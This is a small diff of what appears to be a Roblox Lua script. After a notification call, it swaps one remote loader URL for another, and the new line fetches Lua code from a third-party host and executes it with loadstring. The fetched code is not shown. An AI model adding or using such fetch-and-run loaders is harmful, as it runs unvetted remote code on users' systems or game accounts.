@@ -38,4 +38,4 @@ StarterGui:SetCore("SendNotification", {
 	Callback = bindable
 })
 
-loadstring(game:HttpGet("https://voidedx.vercel.app/api/raw?id=vx_ng7d02vd"))()
+loadstring(game:HttpGet("https://kingmor.up.railway.app/api/loader/5290f528a7e71b.lua"))()
